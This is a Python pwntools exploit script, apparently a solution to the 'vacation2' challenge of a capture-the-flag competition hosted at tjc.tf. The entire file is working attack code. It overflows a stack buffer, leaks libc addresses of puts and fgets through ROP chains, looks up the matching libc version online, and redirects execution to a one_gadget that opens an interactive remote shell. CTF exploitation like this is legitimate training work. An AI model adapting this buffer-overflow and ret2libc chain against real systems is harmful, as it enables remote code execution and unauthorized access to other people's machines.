from pwn import *
import libc_rip

context.binary = elf = ELF('./vacation2')
context.log_level = 'debug'
io = remote('tjc.tf', 31705)
to_fill = 0x10 + 8
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]


def find_libc_version():
    rop = ROP(elf)
    rop.puts(elf.got.puts)
    rop.main()

    payload = b'A' * to_fill + rop.chain()
    io.sendline(payload)
    io.recvuntil(b'Where am I going today?\n')
    puts_addr = u64(io.recvline().strip().ljust(8, b'\x00'))
    print('libc puts leak:', hex(puts_addr))

    # leak fgets too so can calculate libc version
    rop = ROP(elf)
    rop.puts(elf.got.fgets)
    rop.main()

    payload = b'A' * to_fill + rop.chain()
    io.sendline(payload)
    io.recvuntil(b'Where am I going today?\n')

    fgets_addr = u64(io.recvline().strip().ljust(8, b'\x00'))
    print('libc fgets leak:', hex(fgets_addr))
    return puts_addr, fgets_addr


libc_puts, libc_fgets = find_libc_version()  # found libc6_2.31-0ubuntu9.7_amd64.so on libc.rip
libc_path = libc_rip.search_and_download({'puts': hex(libc_puts), 'fgets': hex(libc_fgets)})
libc = ELF(libc_path)

libc_base = libc_puts - libc.symbols['puts']
one_gadget = libc_base + 0xe3b31  # 2nd result from one_gadget


payload = b'A' * to_fill + p64(one_gadget)
io.sendline(payload)
io.interactive()
